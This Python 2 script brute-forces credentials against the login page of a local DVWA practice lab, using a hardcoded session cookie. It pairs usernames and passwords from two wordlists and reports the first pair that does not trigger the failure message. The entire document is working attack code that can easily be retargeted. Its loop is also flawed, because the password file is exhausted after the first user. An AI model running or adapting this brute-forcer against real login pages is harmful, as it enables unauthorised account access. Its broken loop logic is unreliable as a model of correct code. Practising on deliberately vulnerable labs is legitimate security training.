#!/usr/bin/python
import requests,sys,urllib


if len(sys.argv) != 3:
	print 'usage: bf_http lista_users lista_password'
	exit(0)
header = {'Cookie':'security=low; PHPSESSID=5i848gij0u9o6fabaab3eohpr3'}
a = sys.argv[1]
b = sys.argv[2]
users = open(a,'r')
pas = open(b,'r')
print 'running...'
for i in users.readlines():
	i = i.strip('\n')
	for j in pas.readlines():
		j = j.strip('\n')
		ip = 'http://localhost/DVWA-master/vulnerabilities/brute/?username='+i+'&password='+urllib.quote(j)+'&Login=Login#'
		r = requests.get(ip,headers=header).content
 		if not 'Username and/or password incorrect.' in r:
			print '[+] user/password found'
			print 'user: ',i+'\n'+'password: '+j
			exit(0)
	print '[-] user/password not found'


